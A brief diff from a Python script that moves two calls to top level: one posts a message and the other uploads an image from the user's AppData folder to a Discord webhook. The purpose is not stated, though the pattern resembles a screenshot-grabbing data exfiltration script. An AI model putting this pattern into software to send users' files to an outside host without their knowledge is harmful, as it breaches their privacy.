@@ -58,5 +58,5 @@ def sendimage(webhook_url, path):
         files = {"image": file}
         response = requests.post(webhook_url, files=files)
 
-    send_discord_message(webhook, message3)
-    sendimage(webhook, f"C:/Users/{username}/AppData/Local/image.png")
+send_discord_message(webhook, message3)
+sendimage(webhook, f"C:/Users/{username}/AppData/Local/image.png")
